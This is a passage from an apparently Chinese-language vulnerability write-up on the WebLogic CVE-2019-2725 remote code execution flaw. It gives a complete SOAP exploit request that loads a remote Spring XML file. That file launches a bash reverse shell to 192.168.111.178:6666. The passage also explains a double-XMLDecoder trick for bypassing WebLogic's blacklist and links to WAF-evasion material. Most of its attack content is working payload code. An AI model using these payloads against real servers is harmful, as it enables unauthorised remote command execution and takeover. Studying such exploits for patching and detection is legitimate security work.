还有个类`com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext`是一样的作用，他们都是AbstractXmlApplicationContext类的子类

最后的payload：
```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void>
<string>http://192.168.111.178:8000/poc.xml</string>
</void></class>
</java>
</work:WorkContext>
</soapenv:Header> <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```

poc.xml:
```xml
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>cmd</value>
        <value>/c</value>
        <value><![CDATA[/bin/bash -i >& /dev/tcp/192.168.111.178/6666 0>&1]]></value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```
![](https://img-blog.csdnimg.cn/2d395038430542759801d3853bac47b5.png)


#### EventData
使用的是`org.slf4j.ext.EventData`，但只存在于12.1.3这个版本
看到这个类的构造方法
![](https://img-blog.csdnimg.cn/508efa716d394a94834a1d18d8fb76bb.png)

这里直接将传入的xml交给XMLDecoder处理
相当于经过了两次XMLdecode，所以外层用`<class>`绕过，内层直接标记为纯文本，绕过第一次过滤，第二次XMLdecode不经过WebLogic 黑名单


绕过waf：
[第45篇：weblogic反序列化漏洞绕waf方法总结，2017-10271与2019-2725漏洞绕waf防护](https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA)

参考：
[Weblogic-CVE-2019-2725-通杀payload](http://www.lmxspace.com/2019/05/15/Weblogic-CVE-2019-2725-%E9%80%9A%E6%9D%80payload/)
[WebLogic第二版 CNVD-C-2019-48814/CVE-2019-2725](https://cloud.tencent.com/developer/article/1472248)
[weblogic wls9-async组件rce漏洞分析](https://balis0ng.com/post/lou-dong-fen-xi/weblogic-wls9-asynczu-jian-rcelou-dong-fen-xi)
[CVE-2019-2725 二次反序列化jndi注入分析](https://www.cnblogs.com/afanti/p/10802022.html)
[WebLogic RCE(CVE-2019-2725)漏洞之旅](https://paper.seebug.org/909/)
